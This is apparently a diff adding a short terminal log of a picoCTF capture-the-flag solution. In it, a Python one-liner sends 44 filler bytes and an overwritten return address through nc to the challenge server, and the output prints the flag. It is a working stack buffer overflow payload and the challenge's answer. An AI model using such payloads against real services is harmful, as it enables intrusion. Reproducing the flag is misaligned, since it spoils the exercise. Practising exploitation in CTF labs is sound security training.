@@ -1,0 +1,5 @@
+┌──(santey22㉿santey22)-[~]
+└─$ python3 -c 'import sys,struct; sys.stdout.buffer.write(b"A"*44 + struct.pack("<I", 0x08049276) + b"\n")' | nc dolphin-cove.picoctf.net 57585
+Enter the secret key: You entered:, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAv 
+
+Flag: picoCTF{fgets_0v3rfl0w42_76c69135}
